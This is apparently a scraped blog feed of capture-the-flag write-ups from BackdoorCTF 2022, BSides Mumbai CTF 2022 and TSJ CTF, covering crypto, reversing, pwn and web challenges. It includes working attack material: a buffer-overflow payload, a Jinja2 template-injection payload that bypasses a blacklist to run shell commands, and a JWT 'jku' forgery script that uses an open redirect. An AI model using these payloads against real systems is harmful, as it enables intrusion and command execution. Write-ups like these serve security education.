/usr/srv/secrets/y0u_f0und_m3_l0l.txt. What a good forensick challenge!\nPwn babystl (13 solves) Solved by botton\nInput some garbage randomly then get the flag. Solved within one minute :)\nLook back in ida, we would find a function checker that give us the shell\nint allocator_s\u0026lt;char *\u0026gt;::checker() { int result; // eax  result = _alloc_s; if ( (unsigned int)_alloc_s \u0026gt; 0x10000 ) return system(\u0026#34;/bin/sh\u0026#34;); return result; } The _alloc_s is next to the stack_storage, if we call push message with stack, the program will push a heap address in it.\n.bss:000000000000B2F0 stack_storage dq 2 dup(?) ; DATA XREF: allocator_s\u0026lt;char *\u0026gt;::push_back(char * const\u0026amp;)+87↑o .bss:000000000000B2F0 ; allocator_s\u0026lt;char *\u0026gt;::emplace_back(char * const\u0026amp;)+9E↑o ... .bss:000000000000B300 public __alloc_s .bss:000000000000B300 __alloc_s dd ? ; DATA XREF: allocator_s\u0026lt;char *\u0026gt;::checker(void)+10↑r Therefore, we can call three times push message and it will push a address in _alloc_s. Finally, we can call read message to trigger the checker function.\nMisc Welcome (87 solves) Solved by fsharp\nSometime after the CTF began, a few channels in the BackdoorCTF Discord server had newly pinned messages. One of those pinned messages is from the #random channel and contains the flag:\nLet\u0026rsquo;s Blend in (23 solves) Solved by fsharp\nA picture of a blender is provided. Running binwalk against the image shows that it contains an embedded zip file. After extracting its contents with binwalk -e --dd=.* blender.png, we see that it contains 5 grayscale images, each titled b, d, e, l and n.\nChecking the values of pixels for each of the 5 images reveals that they could be interpreted as ASCII characters. The following Python script is written to extract these pixel values and turn them into text:\nfrom PIL import Image image_names = [\u0026#39;b\u0026#39;, \u0026#39;l\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;d\u0026#39;] for image_name in image_names: image = Image.open(image_name, \u0026#39;r\u0026#39;) pixel_values = [] for y in range(image.height): for x in range(image.width): coords = (x, y) pixel_value = image.getpixel(coords) pixel_values.append(pixel_value) print(image_name) print(bytes(pixel_values).decode()) print() image.close() We get the following output:\nb bpy.ops.object.text_add() ob=bpy.context.object ob.data.body = \u0026quot;-... --- .-. -\u0026quot; l bpy.ops.object.text_add(location=(5,0,0)) ob=bpy.context.object ob.data.body = \u0026quot;. - --- ... - .- -\u0026quot; e bpy.ops.object.text_add(location=(10,0,0)) ob=bpy.context.object ob.data.body = \u0026quot;. -.. --- ..- - .\u0026quot; n bpy.ops.object.text_add(location=(15,0,0)) ob=bpy.context.object ob.data.body = \u0026quot;.. --- .-- --\u0026quot; d bpy.ops.object.text_add(location=(20,0,0)) ob=bpy.context.object ob.data.body = \u0026quot;- -. .----. - -... .-.. . -. -..\u0026quot; The text from each image is part of a script that creates objects with text using the Blender Python API. Each object contains Morse code and are placed in specific positions.\nDirectly translating each piece of Morse code into letters shows something resembling English but with spelling errors. But what if we concatenate each piece of Morse code together without spaces and translate that instead?\nUsing the Morse code translator from morsecode.world, we translate -... --- .-. -. - --- ... - .- -. -.. --- ..- - ... --- .-- --- -. .----. - -... .-.. . -. -..\nto get BORNTOSTANDOUTSOWON'TBLEND\nSo, the flag is flag{BORNTOSTANDOUTSOWON'TBLEND}. And yes, it\u0026rsquo;s case-sensitive, because why not.\n","permalink":"https://b6a.black/posts/2022-12-24-backdoorctf/","summary":"We played BackdoorCTF and we won the second place.","title":"BackdoorCTF 2022 Writeup"},{"content":"We played BSides Mumbai CTF 2022 last week and we got the third. This is the write-up on the challenges we solved.\nCrypto Poet Xor Solved by Mystiz and LifeIsHard\n XOR was a famous poet of 1931. Please help him recover his poem. Read his poem and you\u0026rsquo;ll get your reward in the the last line.\n From the description, we can guess that the flag is in the last line. Therefore, the first 9 characters of the last line would be BSMumbai{.\nFrom the source code, the 8-bytes key wee is re-used to encrypt the whole message (can see from the part with itertools.cycle).\nwee = token_bytes(8) cipher = \u0026#39;\u0026#39; for secret in FLAG: enc = bytes([ a ^ b for a,b in zip(secret, cycle(wee)) ]) cipher += enc.hex() + \u0026#39;\\n\u0026#39; We can recover the key by XOR(\u0026quot;BSMumbai\u0026quot;, first 8 bytes in the last line), and the recovered key is e3245defe0693bd5 in hex.\nLastly, we can use this key to decrypt the whole message.\nfrom pwn import * from itertools import cycle enc_flag = [] for each in open(\u0026#34;flag.enc\u0026#34;, \u0026#34;rb\u0026#34;).read().strip().split(b\u0026#39;\\n\u0026#39;): chg_to_bytes = bytes.fromhex(each.decode()) enc_flag.append(chg_to_bytes) key = xor(b\u0026#39;BSMumbai\u0026#39;, enc_flag[-1][0:8]) for each in enc_flag: dec = bytes([a^b for a,b in zip(each, cycle(key))]) print(dec.decode()) Message Two bits meet, each with its own One zero, one one, they are shown Together they combine, with a XOR A new value is formed, never a bore. BSMumbai{w0w_1t_1s_4_fl4g_1n_th3_3nd} Big RSA Solved by fsharp\nIn this challenge, the keygen function is vulnerable because d generated is too small (only 256 bits long).\ndef keygen(nbit): p, q = [ getPrime(nbit) for _ in range(2)] n = p * q phi = (p-1)*(q-1) d = getPrime(1 \u0026lt;\u0026lt; 8) e = inverse(d, phi) key = RSA.construct((n,e,d)) return key By using Boneh-Durfee\u0026rsquo;s attack on small private key ($d \u0026lt; n^{0.292}$), we can effectively recover $d$ and thus decrypt the flag.\nEggLamal Solved by TWY\np = 115078219706537820316093419550008778668298868969654363080518222102779290700853879865170620916229166052063746242902440779410550578694707144210633296690382432644415742679112077458888533507037390392699530015820685944880948493006250673913564751534741449674725051026956477952614364976390284943915858542458481633021 A = 48890218165207275384445272760319358494993711787764906344148899636830485571816493761890964821064860895870242607424457731879309015681135499755293950202646357931855881875967656082276910385046805408731969845166675695997431519571773494534682366571816880592306777375053888105629800076931253497892185033268394556781 B = 115078219706537820316093419550008778668298868969654363080518222102779290700853879865170620916229166052063746242902440779410550578694707144210633296690382432644415742679112077458888533507037390392699530015820685944880948493006250673913564751534741449674725051026956477952614364976390284943915858542458481633020 c = 115078219706537820316093419550008778668298868969654363080518222102779290700853879865170620916229166052063746242902440779410550578694707144210633296690382432644415742679112077458888533507037390392699530015820685944327549289896366601363210341233716225794241970836585781027518436156355332169658951220307457142144 In this challenge, we are given $p$, $A := g^a\\ \\text{mod}\\ p$, $B := g^b\\ \\text{mod}\\ p$. $s$ is computed by $A^b\\ \\text{mod}\\ p$ and we are also given $c := s \\cdot m\\ \\text{mod}\\ p$ for message $m$. Notably $B = p-1$.\nThat would say, $b$ could be $(p-1)/2$. Anyway, this would either make $s = 1$ if $a$ is even or $s = p-1$ otherwise.\nSince $c$ is very close to $p$, it is likely that $s = p-1$. Therefore, $m = -c\\ \\text{mod}\\ p$.\nFlag: BSMumbai{ElGamal_Publickey_Cryptography}.\nECCSub Solved by Mystiz and LifeIsHard\nFrom the source code, every character k in the flag is encrypted with hex(ECC_encode(int(os.urandom(8).hex() + hex(k)[2:], 16)))\n adding 8 random bytes at the front of the character (hex value, in string format) convert it to integer (in base 16) pass the integer to the ECC_encode function convert the returning integer to hex string  def ECC_encode(x): y2 = (x**3 + a*x + b) % p return y2 We need to solve the modular function (p, a, b are given, need to find x), which can be solved with sage:\nC = open(\u0026#39;flag.enc\u0026#39;, \u0026#39;r\u0026#39;).read().strip() C = [int(char, base=16) for char in eval(C)] for each in C: p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff a = 0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b P.\u0026lt;x\u0026gt; = PolynomialRing(GF(p)) p = x^3 + a*x + b - each n = p.roots()[-1][0] print(chr(int(hex(n)[-2:],base=16)),end=\u0026#39;\u0026#39;) Flag: BSMumbai{Substitution_Cipher_With_Elliptic_Curves?}.\nASD-SEA Solved by Mystiz and fsharp\nThe signing algorithm defined for DSA is insecure, in the sense of the random has only two bytes of unknowns.\ndef sign(msg): h = SHA.new(msg).digest() n = bytes_to_long(h + os.urandom(2)) assert 1 \u0026lt; n \u0026lt; key.q-1 r = pow(key.g,n,key.p) % key.q s = inverse(n, key.q)*(bytes_to_long(h) + key.x*r) % key.q return s, r In that way, we can brute force for $n$ using $r$ and retrieve the correct $n$. Afterwards, we can use $s$ to obtain the secret key $x$:\nfrom Crypto.Util.Padding import pad, unpad from Crypto.Util.number import * from Crypto.PublicKey import DSA from Crypto.Cipher import AES from Crypto.Hash import SHA s = 14183199055240594428827443533180344323710704440445050743687023631136 r = 5334730754297077906351686352081826499252324846119218024815564201902 ct = long_to_bytes(0x5bfb9c359d2986411837be748915ae0f5a4d5646b2740b8c4b712399a984dd60475dc1b72efb703bee0f87c256cde05e) key = DSA.import_key(open(\u0026#34;pubkey.pem\u0026#34;, \u0026#34;rb\u0026#34;).read()) m = open(\u0026#34;msg.txt\u0026#34;, \u0026#34;rb\u0026#34;).read() h = SHA.new(m).digest() for i in range(2**16): n = bytes_to_long(h + i.to_bytes(2, \u0026#34;big\u0026#34;)) if pow(key.g, n, key.p) % key.q == r: break x = ((s * n - bytes_to_long(h)) * inverse(r, key.q)) % key.q aes_key = pad(long_to_bytes(x), 16) cipher = AES.new(aes_key, AES.MODE_ECB) flag = unpad(cipher.decrypt(ct), 16).decode() print(flag) # BSMumbai{DSA_msg_related_nonce_problem} Misc Boot2Root - 1 Solved by Kaiziron\nhttps://github.com/Kaiziron/bsides_mumbai_ctf_2022/blob/main/boot2root1.md\nBoot2Root - 2 Solved by Kaiziron\nhttps://github.com/Kaiziron/bsides_mumbai_ctf_2022/blob/main/boot2root2.md\nPwn warmup Solved by cire meat pop\nObviously, vuln is vulnerable to buffer overflow attack. However, since win function stores the 1st and 2nd arguments on stack and compare if they are equal to some constant, we can\u0026rsquo;t directly call win to get flag. To bypass this, we overwrite the return address of vuln to call win+22 such that it only compares the constant with the values on stack which depends on rbp, and the value of rbp can be controlled via buffer overflow attack.\nSolve  Send random words to get the stack address Calculate the address for storing user input by minus a fix offset Crafting the payload: p64(user_input+0x20) + b'\\xba\\x00\\xb0\\x00\\xbe\\xba\\xcc\\x5e' + b'\\x00'*0x10 + p64(user_input) + b'\\x8e' Send the payload to trigger buffer overflow capture flag on screen  Web Useless Forum Solved by Ja5on\n Found admin user from the 2 initial posts Saw graphql query, use GraphQLmap to dump schema there are \u0026ldquo;getUser\u0026rdquo; and \u0026ldquo;getUserV2\u0026rdquo; mutations, the webapp use \u0026ldquo;getUserV2\u0026rdquo; only. Try to use \u0026ldquo;getUser\u0026rdquo; mutation to get Admin info and compare the two responses, identified a hidden post with postID \u0026ldquo;85a270fb-3520-452b-9532-dc198cea99bc\u0026rdquo; The type comment contain the type post, use mutation \u0026ldquo;makeComment\u0026rdquo; to make comment on the hidden post, and request for the post content to get the flag: {\u0026quot;query\u0026quot;:\u0026quot;mutation{\\n \\t\\tmakeComment(token:\\\u0026quot;TOKEN\\\u0026quot;,text:\\\u0026quot;abc\\\u0026quot;,postID:\\\u0026quot;85a270fb-3520-452b-9532-dc198cea99bc\\\u0026quot;){\\n \\t\\t\\tcommentID\\n text\\npost{content}\\n \\t\\t\\t}\\n\\t\\t}\u0026quot;}  Complaint Box Solved by Ja5on\n random fill in the form, got error message \u0026ldquo;Does email really need those?, anyway here are the blaclisted keywords ['{{', \u0026lsquo;}}\u0026rsquo;, \u0026lsquo;.\u0026rsquo;, \u0026lsquo;_\u0026rsquo;, \u0026lsquo;0\u0026rsquo;, \u0026lsquo;1\u0026rsquo;, \u0026lsquo;2\u0026rsquo;, \u0026lsquo;3\u0026rsquo;, \u0026lsquo;4\u0026rsquo;, \u0026lsquo;5\u0026rsquo;, \u0026lsquo;6\u0026rsquo;, \u0026lsquo;7\u0026rsquo;, \u0026lsquo;8\u0026rsquo;, \u0026lsquo;9\u0026rsquo;]\u0026rdquo; python server + blacklisted keywords \u0026lsquo;{{\u0026rsquo;, \u0026lsquo;}}\u0026rsquo; -\u0026gt; SSTI in email field use {% %} bypass the \u0026lsquo;{{\u0026rsquo;, \u0026lsquo;}}\u0026rsquo; filter, payload {% print(config) %} work use |attr to bypass \u0026ldquo;.\u0026rdquo;, use request.values for string subsitution. Final payload : name=ab\u0026amp;xx=__class__\u0026amp;xy=__base__\u0026amp;xz=__subclasses__\u0026amp;yy=__getitem__\u0026amp;yz=84\u0026amp;zz=load_module\u0026amp;email={%set+a=request[\u0026quot;values\u0026quot;][\u0026quot;xx\u0026quot;]%}{%set+b=request[\u0026quot;values\u0026quot;][\u0026quot;xy\u0026quot;]%}{%set+c=request[\u0026quot;values\u0026quot;][\u0026quot;xz\u0026quot;]%}{%set+d=request[\u0026quot;values\u0026quot;][\u0026quot;yy\u0026quot;]%}{%set+e=request[\u0026quot;values\u0026quot;][\u0026quot;yz\u0026quot;]%}{%set+f=request[\u0026quot;values\u0026quot;][\u0026quot;zz\u0026quot;]%}{%print([]|attr(a)|attr(b)|attr(c)()|attr(d)(e|int)|attr(f)(\u0026quot;os\u0026quot;)|attr(\u0026quot;popen\u0026quot;)(\u0026quot;cat+flag*\u0026quot;)|attr(\u0026quot;read\u0026quot;)())%}\u0026amp;subject=ab\u0026amp;message=ab  Bongo Cat Solved by Hollow\n Check cookie, find JWT. Seeing \u0026ldquo;jku\u0026rdquo; in header -\u0026gt; You can specify the issuer yourself. Noting that the issuer must be from the same host, look for open redirect in the website. There is a endpoint /?redirect_uri=/dashbord. Asserting that it can redirect to external resources. Craft RSA keypair with openssl genrsa -out priv.pem 2048 and openssl rsa -pubout -in priv.pem -out pub.pem Dump n and e from the private key with RsaCtfTool python3 RsaCtfTool.py --key priv.pem --dump Convert n and e into base64-encoded standard with the following code: (Credit: Mystiz)  import base64 n = e = n = int.to_bytes(n, (n.bit_length()+7)//8, \u0026#39;big\u0026#39;) e = int.to_bytes(e, (e.bit_length()+7)//8, \u0026#39;big\u0026#39;) print(base64.urlsafe_b64encode(n)) print(base64.urlsafe_b64encode(e)) Create a file named jwks.json and host it on your server.  {\u0026#34;kty\u0026#34;:\u0026#34;RSA\u0026#34;,\u0026#34;e\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;use\u0026#34;:\u0026#34;sig\u0026#34;,\u0026#34;alg\u0026#34;:\u0026#34;RS256\u0026#34;,\u0026#34;n\u0026#34;:\u0026#34;\u0026#34;} Sign the JWT with data {\u0026quot;user\u0026quot;:\u0026quot;admin\u0026quot;} and submit the cookie.  import jwt import requests private_key = open(\u0026quot;priv.pem\u0026quot;).read().strip() public_key = open(\u0026quot;pub.pem\u0026quot;).read().strip() encoded = jwt.encode({\u0026quot;user\u0026quot;:\u0026quot;admin\u0026quot;},private_key,algorithm=\u0026quot;RS256\u0026quot;, headers={\u0026quot;alg\u0026quot;:\u0026quot;RS256\u0026quot;,\u0026quot;typ\u0026quot;:\u0026quot;JWT\u0026quot;,\u0026quot;jku\u0026quot;:\u0026quot;http://34.133.45.223/?redirect_uri=https://asdfasdf/jwks.json\u0026quot; }) r = requests.get(\u0026quot;http://34.133.45.223/dashboard\u0026quot;, headers={\u0026quot;Cookie\u0026quot;:f\u0026quot;token={encoded}\u0026quot;}) print(r.text) P.S. Thanks for the work that Mystiz has checked that n is secure and is not vulnerable to common factorization attacks.\nReverse Warmup Solved by fsharp\nThe file is the emitted LLVM IR of a C program for checking a password. The program could be summarized as follows:\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt; int main() { char password[100]; printf(\u0026#34;Enter a string: \u0026#34;); scanf(\u0026#34;%s\u0026#34;, \u0026amp;password); if (strlen(password) != 39) exit(0); if ((int)password[28] == 55 \u0026amp;\u0026amp; (int)password[30] == 110 \u0026amp;\u0026amp; ... \u0026amp;\u0026amp; (int)password[20] == 110) printf(\u0026#34;The flag is correct!\\n\u0026#34;); else printf(\u0026#34;The flag is incorrect.\\n\u0026#34;); return 0; } Save every line from the start of label 10 (10: ... ; preds = %0) to the blank line after the end of label 200 into a file called lines.txt. Then, run the following script to construct the flag:\nwith open(\u0026#34;lines.txt\u0026#34;, \u0026#39;r\u0026#39;) as f: lines = f.read().splitlines() flag_tuples = [] for i in range(0, len(lines), 7): second_line = lines[i + 1] chr_pos = int(second_line[second_line.rindex(\u0026#39; \u0026#39;) + 1:]) fifth_line = lines[i + 4] chr_val = int(fifth_line[fifth_line.rindex(\u0026#39; \u0026#39;) + 1:]) flag_tuples.append((chr_pos, chr_val)) flag = \u0026#34;\u0026#34; for (pos, val) in sorted(flag_tuples): flag += chr(val) print(flag) The flag is BSM{1_f0und_my531f_1n_4_f10471n9_h0u53}.\nonionkopon Solved by Mystiz and fsharp\nWe have a small C program that checks if the password length is a multiple of 8, then encodes each 8-byte block of the password. If these blocks all match 40 given bytes, the password\u0026rsquo;s correct.\nThe program logic is summarized as follows:\ndef rol(u, n): return ((u\u0026lt;\u0026lt;n) | (u\u0026gt;\u0026gt;(16-n))) \u0026amp; 0xffff def process_block(pw_block): pw = [int.from_bytes(pw_block[i:i+2], \u0026#39;little\u0026#39;) for i in range(0, 8, 2)] xor_buffer = [0xDEAD, 0xBEEF, 0xCAFE, 0xBABE] for _ in range(16): for i in range(4): pw[(i+1) % 4] = ((pw[i] ^ xor_buffer[i]) + pw[(i+1) % 4]) \u0026amp; 0xffff pw[(i+1) % 4] = rol(pw[(i+1) % 4], 12) return b\u0026#39;\u0026#39;.join([int.to_bytes(p, 2, \u0026#39;little\u0026#39;) for p in pw]) correct_pw = b\u0026#34;...\u0026#34; encoded = b\u0026#34;\u0026#34; assert len(correct_pw) % 8 == 0 for i in range(0, 40, 8): encoded += process_block(correct_pw[i : i + 8]) assert encoded == bytes.fromhex(\u0026#34;100baacdddd46faa1c0fe0abcbf8fc45e607ac4bedcd1cef29c73102bb971afd6a34a94c7a90ab5c\u0026#34;) We write a function to invert the operations done onto each encoded block to find the flag:\ndef rol(u, n): return ((u\u0026lt;\u0026lt;n) | (u\u0026gt;\u0026gt;(16-n))) \u0026amp; 0xffff def inverse_process_block(pw_block): pw = [int.from_bytes(pw_block[i:i+2], \u0026#39;little\u0026#39;) for i in range(0, 8, 2)] xor_buffer = [0xDEAD, 0xBEEF, 0xCAFE, 0xBABE] for _ in range(16): for i in [3, 2, 1, 0]: pw[(i+1) % 4] = rol(pw[(i+1) % 4], 4) pw[(i+1) % 4] = (pw[(i+1) % 4] - (pw[i] ^ xor_buffer[i])) \u0026amp; 0xffff return b\u0026#39;\u0026#39;.join([int.to_bytes(p, 2, \u0026#39;little\u0026#39;) for p in pw]).decode() encoded = bytes.fromhex(\u0026#34;100baacdddd46faa1c0fe0abcbf8fc45e607ac4bedcd1cef29c73102bb971afd6a34a94c7a90ab5c\u0026#34;) flag = \u0026#34;\u0026#34; for i in range(0, len(encoded), 8): flag += inverse_process_block(encoded[i : i + 8]) print(f\u0026#34;BSM{{{flag}}}\u0026#34;) The flag is BSM{__4dv32517y_15_7h3_f1257_p47h_70_72u7h__}.\nThe Last One Solved by TWY, grhkm and fsharp\nThe file is a PYC file from Python 3.11. To the best of our knowledge, the current programs that offer functionality for disassembling PYC files or turning them into an equivalent Python script (e.g. decompyle3, uncompyle6, pycdc, pydumpck) do not yet support this version of Python, which was only released around 45 days before the CTF started. So, we instead chose to disassemble the file using Python 3.11.0 directly:\nimport marshal, dis f = open(\u0026#34;rev5\u0026#34;, \u0026#34;rb\u0026#34;) _ = f.seek(16) code = marshal.load(f) f.close() print(dis.dis(code)) print(dis.show_code(code)) After reading through the disassembly, the program logic is basically:\nimport sys ror = lambda val, r_bits, max_bits: ((val \u0026amp; (2 ** max_bits - 1)) \u0026gt;\u0026gt; (r_bits % max_bits)) | ((val \u0026lt;\u0026lt; (max_bits - (r_bits % max_bits)) \u0026amp; (2 ** max_bits - 1))) qq = (498447548, 3732380986, 1488213715, 2972884408, 3671789619, 1370551614, 1547410907, 3107329395, 299046427, 2038167384, 974344249, 1531985406, 2620489075, 301338675, 1367072094, 1010523443, 1364594739, 1362851550, 3157990840, 3671465363, 4054904883, 1369151198, 3158031800, 3671465299, 833682835, 4049313075, 1369141299, 1362867902, 3694861656, 985013651, 4048590195, 295403003, 2575023507, 4059258195, 832296243, 1364966747, 960197747) def check2(r): r1 = (r \u0026amp; 255) ^ 254 r2 = ((r \u0026gt;\u0026gt; 8) \u0026amp; 255) ^ 186 r3 = ((r \u0026gt;\u0026gt; 16) \u0026amp; 255) ^ 202 r4 = ((r \u0026gt;\u0026gt; 24) \u0026amp; 255) ^ 190 return (r4 \u0026lt;\u0026lt; 24) | (r3 \u0026lt;\u0026lt; 16) | (r2 \u0026lt;\u0026lt; 8) | r1 def check(s): l = [] for i in range(len(s) - 3): r = int.from_bytes(s[i:i + 4], \u0026#39;little\u0026#39;) ^ 3735928559 n = check2(r) l.append(ror(r, 19, 32)) return l str = input(\u0026#39;Enter a string: \u0026#39;).encode() if len(str) != 40: sys.exit() m = check(str) for i, j in zip(m, qq): if i != j: print(\u0026#39;dasnot it mofo\u0026#39;) sys.exit() print(\u0026#39;GGWP bro\u0026#39;) We wrote the following program to get the flag:\nror = lambda val, r_bits, max_bits: ((val \u0026amp; (2 ** max_bits - 1)) \u0026gt;\u0026gt; (r_bits % max_bits)) | ((val \u0026lt;\u0026lt; (max_bits - (r_bits % max_bits)) \u0026amp; (2 ** max_bits - 1))) qq = (498447548, 3732380986, 1488213715, 2972884408, 3671789619, 1370551614, 1547410907, 3107329395, 299046427, 2038167384, 974344249, 1531985406, 2620489075, 301338675, 1367072094, 1010523443, 1364594739, 1362851550, 3157990840, 3671465363, 4054904883, 1369151198, 3158031800, 3671465299, 833682835, 4049313075, 1369141299, 1362867902, 3694861656, 985013651, 4048590195, 295403003, 2575023507, 4059258195, 832296243, 1364966747, 960197747) def check2(r): r1 = (r \u0026amp; 255) ^ 254 r2 = ((r \u0026gt;\u0026gt; 8) \u0026amp; 255) ^ 186 r3 = ((r \u0026gt;\u0026gt; 16) \u0026amp; 255) ^ 202 r4 = ((r \u0026gt;\u0026gt; 24) \u0026amp; 255) ^ 190 return (r4 \u0026lt;\u0026lt; 24) | (r3 \u0026lt;\u0026lt; 16) | (r2 \u0026lt;\u0026lt; 8) | r1 def check_rev(r): return bytes.fromhex(hex(ror(r, 32 - 19, 32) ^ 3735928559)[2:].zfill(8))[::-1] qq_rev = [check_rev(x) for x in qq] print((b\u0026#34;\u0026#34;.join([a[0:1] for a in qq_rev[:-1]]) + qq_rev[-1]).decode()) The flag is BSM{7h3_w0und_15_47_h32_h3427_k42u124w4}.\nPiano Solved by fsharp\nWe\u0026rsquo;re given a Rust binary that checks if the entered password is 65 characters long, then subjects each character in the password to a series of bit shifts and XORs. The password\u0026rsquo;s correct if these characters all match 65 given bytes. Given how safe Rust is by default, only a very small portion of the disassembled program is relevant, and the rest is mostly for dealing with errors like integer overflows.\nThe program logic is roughly as follows in Python:\nimport sys pw = bytearray(input(\u0026#34;Enter something:\\n\u0026#34;).encode()) encoded = bytes.fromhex(\u0026#34;66cf77b25360f45e8ba8426aa77217d7fce8f2c4e427120ccf5d857a68d7b5c8570f59588d14896abea468dbf3d0a00fe03b8ba9ca8ddebd138338e0624ff8109a\u0026#34;) if len(pw) != 65: print(\u0026#34;Hmmm...\u0026#34;) sys.exit() for i in range(len(pw)): c = pw[i] shift_amount = i % 7 if (i % 2) == 0: shifted = ((c \u0026gt;\u0026gt; shift_amount) | (c \u0026lt;\u0026lt; (8 - shift_amount))) % 256 shifted ^= 0x24 else: shifted = ((c \u0026lt;\u0026lt; shift_amount) | (c \u0026gt;\u0026gt; (8 - shift_amount))) % 256 shifted ^= 0x69 pw[i] = shifted if pw == encoded: print(\u0026#34;Good Job ^^\u0026#34;) Rather than going through the tedium of undoing the XORs and bit shifts, a small Python program is written to bruteforce each character as follows:\nencoded = bytes.fromhex(\u0026#34;66cf77b25360f45e8ba8426aa77217d7fce8f2c4e427120ccf5d857a68d7b5c8570f59588d14896abea468dbf3d0a00fe03b8ba9ca8ddebd138338e0624ff8109a\u0026#34;) flag = \u0026#34;\u0026#34; for i in range(len(encoded)): for c in range(32, 127): shift_amount = i % 7 if (i % 2) == 0: shifted = ((c \u0026gt;\u0026gt; shift_amount) | (c \u0026lt;\u0026lt; (8 - shift_amount))) % 256 shifted ^= 0x24 else: shifted = ((c \u0026lt;\u0026lt; shift_amount) | (c \u0026gt;\u0026gt; (8 - shift_amount))) % 256 shifted ^= 0x69 if shifted == encoded[i]: flag += chr(c) break print(flag) The flag is BSM{wH47_p30pl3_c0mm0NlY_C4LL_F473_1S_m0S7LY_7H31R_0wN_S7up1d17y}.\n","permalink":"https://b6a.black/posts/2022-12-14-bsides-mumbai/","summary":"We played BSides Mumbai CTF 2022 last week and we got the third. This is the write-up on the challenges we solved.","title":"BSides Mumbai CTF 2022 Writeup"},{"content":"We played TSJ CTF last weekend and we won! This is the writeups of our challenges:\n    Challenge Name Category Points Writeup     Futago CSC, Crypto 56 Link   Completely Secure Cryptography CSC, Misc 116 Link   Nimja at Nantou Web 133 Link   babyRSA Crypto 276 Link   Top Secret Crypto 325 Link   Cipher Switching Service Crypto 416 Mystiz's blog   Signature Crypto 469 Mystiz's blog   RNG++ Crypto 213 Link   RNG+++ Crypto 469 Link   Genie Web, Crypto 500 Link   Remote Code TeXecution 1 Misc 500 Link    Futago Solved by Mystiz and grhkm; writeup compiled by grhkm.\nWe are given three different folders, each containing RSA challenges which we shall solve to get the full flag. Firstly, here is how to read the .pub files in Python:\nfrom Crypto.PublicKey import RSA key = RSA.import_key(open(\u0026#39;key.pub\u0026#39;, \u0026#39;r\u0026#39;).read()) print(key.n, key.e) With this in mind, let's look at each of the three stages. Note that since this is a CSC challenge, there is quite a bit of guessing involved, but I will try to explain the motivation behind each.\n Stage 1 We are given two RSA keys with $n\\sim 2^{2048}$ and $e = 65537$, so there is seemingly no obvious attack on the modulus itself. However, we can guess that the modulus $n_1$ and $n_2$ are generated with a shared prime factor i.e. $n_1 = pq_1$ and $n_2 = pq_2$. This way, we can take their $\\gcd$ to extract and factorise the modulus.\nRelevant code:\nfrom math import gcd from Crypto.Util.number import bytes_to_long, long_to_bytes p = gcd(n1, n2) q1 = n1 // p q2 = n2 // p d1 = pow(e1, -1, (p - 1) * (q1 - 1)) d2 = pow(e2, -1, (p - 1) * (q2 - 1)) c1 = open(\u0026#39;flag.txt.key1.enc\u0026#39;, \u0026#39;rb\u0026#39;).read() print(long_to_bytes(pow(bytes_to_long(c1), d1, n1)).decode()) # Flag: TSJ{just_several_common_rsa_tricks_combined_together_ # decrypting flag.txt.key2.enc gives the same flag Note that we have $m_1 = m_2$ for the plaintext\n Stage 2 This time, we are given $n_1 = n_2$, $e_1 = 293613$ and $e_2 = 3981$, so\n\\[\\begin{aligned} c_1 \u0026\\equiv m^{e_1} \\mod pq \\\\ c_2 \u0026\\equiv m^{e_2} \\mod pq \\end{aligned}\\]\nFrom this, it is a standard trick to try to find $k_1, k_2$ such that $k_1e_1 + k_2e_2 = 1$ using the extended euclidean algorithm, as that will give\n\\[c_1^{k_1}c_2^{k_2}\\equiv m^{k_1e_1 + k_2e_2}\\equiv m\\mod pq\\]\nHowever, here we have $\\gcd(e_1, e_2) = 3$, meaning they're not coprime. Therefore, we instead find $k_1, k_2$ such that $k_1e_1 + k_2e_2 = 3$, and $m$ from $m^3$ by taking cube roots in the integers.\nSolve script:\nimport gmpy2 from math import gcd from Crypto.PublicKey import RSA from Crypto.Util.number import bytes_to_long, long_to_bytes # import keys ... # solve k1 * e1 + k2 * e2 == 3 g, k1, k2 = gmpy2.gcdext(e1, e2) assert g == 3 and k1 * e1 + k2 * e2 == g c1 = bytes_to_long(open(\u0026#39;flag.txt.key1.enc\u0026#39;, \u0026#39;rb\u0026#39;).read()) c2 = bytes_to_long(open(\u0026#39;flag.txt.key2.enc\u0026#39;, \u0026#39;rb\u0026#39;).read()) m3 = pow(c1, k1, n1) * pow(c2, k2, n1) % n1 m = gmpy2.iroot(m3, 3)[0] print(long_to_bytes(m).decode()) # Flag: in_a_single_guessy(?)_challenge_  Stage 3 Finally, this time we are given two different $2040$-bit modulus $n_1 = 2256\\ldots 6353$ and $n_2 = 2256\\ldots 3931$, as well as $e_1 = e_2 = 65537$. As you can see, the two modulus are very close. Indeed, we have $|n_2 - n_1| \\sim 2^{1031}$. What does this mean? Well, assuming the parameters for $n_1$ is generated \u0026quot;normally\u0026quot;, we will expect that $n_1 = p_1q_1$ where $p_1\\sim q_1$, typically with $p_1 \u0026lt; q_1 \u0026lt; 2p_1$. This means that $p_1, q_1$ should be around $2^{1020}$, and $|n_2 - n_1| \\sim 2^{11}\\cdot p_1$. More specifically, we can write\n\\[\\begin{align*} n_1 \u0026= p\\cdot q \\\\ n_2 \u0026= (p + \\epsilon_1)\\cdot (q + \\epsilon_2) \\end{align*}\\]\nThen we can expect that\n\\[n_2 - n_1 \\approx p\\epsilon_2 + q\\epsilon_1 \\approx (\\epsilon_1 + \\epsilon_2)\\cdot p \\implies \\epsilon_1 + \\epsilon_2\\approx 2^{11}\\]\nThe range is really small and we can simply bruteforce for $\\epsilon_i$ and check for a factorisation of $n_2$!\n... But wait, how do we check for a factorisation without knowing $p$ and $q$? I got stuck here in-contest but Mystiz reminded me that we have $2$ equations with $2$ unknowns, and we can write a simultaneous equation:\n\\[\\begin{cases} pq \u0026= n_1 \\\\ \\epsilon_2 p + \\epsilon_1 q \u0026= n_2 - n_1 - \\epsilon_1 \\epsilon_2 \\end{cases}\\]\nExplicitly, we get $\\epsilon_2pq = (n_2 - n_1 - \\epsilon_1\\epsilon_2)q - \\epsilon_1q^2 = \\epsilon_2 n_1$\nSolve Script:\nfor eps1, eps2 in itertools.product(map(mpz, range(2, 3000, 2)), repeat=2): a = eps1 b = eps1 * eps2 + n1 - n2 c = eps2 * n1 det = b ** 2 - 4 * a * c if det \u0026lt; 0: continue 